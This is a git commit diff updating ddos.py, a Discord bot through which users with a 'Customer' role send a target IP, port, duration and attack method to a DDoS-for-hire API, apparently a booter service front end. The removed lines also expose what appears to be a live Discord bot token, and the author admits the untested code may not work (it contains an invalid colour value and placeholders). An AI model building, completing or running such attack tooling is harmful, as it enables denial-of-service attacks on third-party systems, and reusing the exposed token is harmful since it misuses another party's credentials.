c4d96242c94ed174c6011544d1fe045a6d9ccd0a
TBN01 <84028040+TBN01@users.noreply.github.com>
2021-05-12 15:54:54 +0100

    Update ddos.py
    Done, not tested my code so gl.

--- ddos.py
+++ ddos.py
@@ -20,13 +20,24 @@ async def on_ready():
   
   
 @client.command()
-@commands.has_any_role("Customer")
-@commands.cooldown(1, 120, customer.BucketType.user) 
-# ^^ 120 Can be swapped with any time you would like.
-async def attack(ctx, arg1, arg2, arg3:int, arg4):
-  try:
-    async with aiohttp.ClientSession() as requests:
-     async with requests.get(f"Pleaseaddyourkeyhere&host={arg1}&port={arg2}&time={arg3}&method={arg4}")
-      embed1 = discord.Embed(title=f'attack sent! :droplet:',color=discord.Color.from_rgb(0, 191, 255))
-      
-client.run("ODQyMDQ2MTg3NDk3NTg2NzI4.YJvmnw.KFaywljKEm6qIzyYCvQ8JnPYLQA")      
+@commands.has_any_role('Customer')
+@commands.cooldown(1, 120, commands.BucketType.user)
+async def attack(ctx, arg1, arg2, arg3: int, arg4):
+    channel = client.get_channel(PutChannelIDHere)
+    if channel == ctx.channel:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"testkey.xyz&ip={arg1}&port={arg2}&time={arg3}&method={arg4}") as r:
+                    b = await r.text()
+                    print(b)
+                    message = await ctx.send("**Sending attack cutie**")
+                    embed1 = discord.Embed(title=f'sent the power!', color=discord.Color.from_rgb(265, 0, 0))
+                    await ctx.send(embed=embed1)
+        except:
+            await ctx.send("Missing key?")
+            
+            
+client.run("tokenhere")
+
+## IF THIS BOT DOES NOT WORK TRY FIND ISSUE.. I HAVE NOT TESTED THIS BOT ONCE SO GOODLUCK, THIS IS THE BASIC AF BOT.
+## I will add HELP List if you contact me on discord: inactive#9049.
